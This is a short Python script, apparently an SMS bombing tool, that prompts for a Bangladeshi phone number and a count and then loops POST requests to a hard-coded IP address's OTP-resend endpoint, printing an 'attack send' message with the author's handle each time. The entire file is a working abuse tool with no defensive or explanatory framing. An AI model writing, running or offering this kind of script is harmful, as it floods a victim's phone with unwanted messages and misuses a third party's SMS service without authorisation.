import requests
from requests.structures import CaseInsensitiveDict
number  = str(input("[>] Enter The BD Number: "))
amount = int(input("[>] Enter The Amount: "))
url = "http://128.199.215.102/api/otpresend"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone="+number

for i in range(amount):
 requests.post(url, headers=headers, data=data)
 print(str(i+1)+" aTTacK SEND By -!-HD-SHaKiiB-!- ")